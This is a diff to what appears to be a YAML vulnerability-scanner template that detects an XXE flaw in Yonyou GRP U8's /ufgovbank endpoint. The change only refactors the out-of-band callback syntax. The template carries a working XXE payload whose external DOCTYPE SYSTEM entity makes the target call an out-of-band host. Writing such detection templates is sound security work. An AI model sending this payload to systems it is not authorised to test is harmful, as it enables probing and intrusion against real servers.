@@ -13,9 +13,6 @@ info:
   tags: yonyou,grp,u8,xxe
   created: 2024/01/16
 
-set:
-  oob: oob()
-  oobHTTP: oob.HTTP
 rules:
   r0:
     request:
@@ -23,6 +20,6 @@ rules:
       path: /ufgovbank
       body: |
         reqData=<?xml version="1.0"?>
-        <!DOCTYPE foo SYSTEM "{{oobHTTP}}">&signData=1&userIP=1&srcFlag=1&QYJM=0&QYNC=adaptertest
-    expression: oobCheck(oob, oob.ProtocolHTTP, 3)
+        <!DOCTYPE foo SYSTEM "{{oob.HTTP}}">&signData=1&userIP=1&srcFlag=1&QYJM=0&QYNC=adaptertest
+    expression: oobCheck(oob.ProtocolHTTP, 3)
 expression: r0()
